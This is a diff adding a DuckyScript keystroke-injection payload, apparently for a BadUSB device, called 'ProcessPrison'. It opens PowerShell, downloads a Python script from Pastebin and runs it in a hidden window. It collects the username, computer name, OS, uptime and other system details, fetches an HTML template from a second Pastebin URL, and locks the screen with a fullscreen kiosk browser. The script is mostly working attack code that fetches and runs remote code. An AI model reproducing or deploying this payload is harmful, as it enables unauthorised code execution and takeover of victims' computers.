@@ -1,0 +1,91 @@
+REM ===================================================================
+REM ProcessPrison - Cross-Platform System Information Collection
+REM ===================================================================
+
+REM Open Run dialog and launch PowerShell
+GUI r
+DELAY 100
+STRING powershell
+ENTER
+DELAY 2000
+
+REM Ensure PowerShell window is focused and ready
+ALT TAB
+DELAY 100
+ALT TAB
+DELAY 100
+
+REM ===============================
+REM STEP 0: Start Sound Player
+REM ===============================
+
+REM Download and execute Python sound script from Pastebin
+STRING iwr "https://pastebin.com/raw/9VGxyUbP" -OutFile "$env:TEMP\sound.py"; Start-Process python "$env:TEMP\sound.py high 50" -WindowStyle Hidden
+ENTER
+DELAY 500
+
+REM ===============================
+REM STEP 1: Setup Variables
+REM ===============================
+
+REM Build the PowerShell command with clear logical sections
+STRING Set-Clipboard '
+
+REM Pastebin URL with cache-busting timestamp
+STRING $u="https://pastebin.com/raw/H9L5CnUy?t=$((Get-Date).Ticks)"; 
+
+REM Basic configuration variables
+STRING $n=$env:USERNAME; $m="System Information Collected"; $t="dark"; 
+
+REM ===============================
+REM STEP 2: Cross-Platform OS Detection
+REM ===============================
+
+REM Windows system information collection
+STRING if($IsWindows -or $env:OS -eq "Windows_NT"){ $os=(Get-CimInstance Win32_OperatingSystem).Caption; $comp=$env:COMPUTERNAME; $screen=(Get-CimInstance Win32_VideoController | Select -First 1 -ExpandProperty VideoModeDescription); if(!$screen){$screen="Unknown"}; $lastboot=(Get-CimInstance Win32_OperatingSystem).LastBootUpTime; $uptime=((Get-Date) - $lastboot); $browser="chrome"; $browserargs="--kiosk" } 
+
+REM Linux system information collection
+STRING else { $os=(uname -a); $comp=(hostname); $screen=(xrandr | grep "*" | awk "{print $1}"); $lastboot=(uptime -s); $uptime=(uptime -p); $browser="firefox"; $browserargs="--kiosk" }; 
+
+REM ===============================
+REM STEP 3: Additional System Info
+REM ===============================
+
+REM Get timezone and format uptime string
+STRING $tz=[System.TimeZoneInfo]::Local.DisplayName; $uptimestr="$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"; 
+
+REM Get keyboard layout with error handling
+STRING try{$kblayout=(Get-WinUserLanguageList | Select -First 1).LanguageTag}catch{$kblayout="en-US"}; if(!$kblayout){$kblayout="en-US"}; 
+
+REM ===============================
+REM STEP 4: Fetch HTML Template
+REM ===============================
+
+REM Try to get template from Pastebin, fallback to basic HTML
+STRING try{$h=iwr $u -useb|%{$_.Content}}catch{$h="<HTML><BODY><H1>{{TITLE}}</H1><P>Hello {{USERNAME}}!</P><P>{{MESSAGE}}</P><P>Theme: {{THEME}}</P><P>Generated: {{TIMESTAMP}}</P></BODY></HTML>"}; 
+
+REM ===============================
+REM STEP 5: Template Processing
+REM ===============================
+
+REM Replace all placeholders with collected system data
+STRING $h=$h-replace"{{USERNAME}}",$n-replace"{{MESSAGE}}",$m-replace"{{THEME}}",$t-replace"{{TITLE}}","System Report for $n"-replace"{{TIMESTAMP}}",(Get-Date -f "yyyy-MM-dd HH:mm:ss")-replace"{{OS_VERSION}}",$os-replace"{{COMPUTER_NAME}}",$comp-replace"{{TIMEZONE}}",$tz-replace"{{SCREEN_RES}}",$screen-replace"{{DEFAULT_BROWSER}}",$browser-replace"{{SYSTEM_UPTIME}}",$uptimestr-replace"{{KEYBOARD_LAYOUT}}",$kblayout; 
+
+REM ===============================
+REM STEP 6: Generate Report & Launch
+REM ===============================
+
+REM Save HTML file and display confirmation message
+STRING $p="$env:TEMP\system_report.html"; $h|Out-File $p -Encoding utf8; "Report generated for: $n"|Write-Host; 
+
+REM Launch browser in fullscreen kiosk mode
+STRING Start-Process $browser "$browserargs $p"; Start-Sleep 2; 
+
+REM Focus the browser window (cross-platform)
+STRING if($IsWindows -or $env:OS -eq "Windows_NT"){ Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::AppActivate($browser) } else { wmctrl -a $browser }'
+ENTER
+
+REM Execute the clipboard contents
+DELAY 100
+CTRL v
+ENTER
